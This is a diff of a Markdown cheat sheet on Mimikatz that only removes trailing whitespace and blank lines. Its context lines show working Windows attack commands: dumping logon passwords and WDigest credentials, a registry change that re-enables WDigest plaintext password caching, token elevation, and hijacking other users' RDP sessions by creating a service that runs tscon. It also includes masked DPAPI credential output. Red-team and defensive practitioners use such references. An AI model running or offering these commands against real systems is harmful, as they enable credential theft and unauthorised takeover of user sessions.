@@ -42,12 +42,13 @@ mimikatz_command -f sekurlsa::logonPasswords full
 mimikatz_command -f sekurlsa::wdigest
 
 # to re-enable wdigest in Windows Server 2012+
-# in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest 
+# in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest
 # create a DWORD 'UseLogonCredential' with the value 1.
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
 ```
 
 :warning: To take effect, conditions are required :
+
 - Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:
   * Adding requires lock
   * Removing requires signout
@@ -57,7 +58,6 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 - Win2016:
   * Adding requires lock
   * Removing requires reboot
-
 
 ## Mimikatz - Mini Dump
 
@@ -115,9 +115,9 @@ Use `ts::multirdp` to patch the RDP service to allow more than two users.
 Run tscon.exe as the SYSTEM user, you can connect to any session without a password.
 
 ```powershell
-privilege::debug 
-token::elevate 
-ts::remote /id:2 
+privilege::debug
+token::elevate
+ts::remote /id:2
 ```
 
 ```powershell
@@ -126,9 +126,6 @@ query user
 create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
 net start sesshijack
 ```
-
-
-
 
 ## Mimikatz - Credential Manager & DPAPI
 
@@ -159,7 +156,6 @@ Flags      : 00004004
 Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 Attributes : 0
 ```
-
 
 ## Mimikatz - Commands list
 
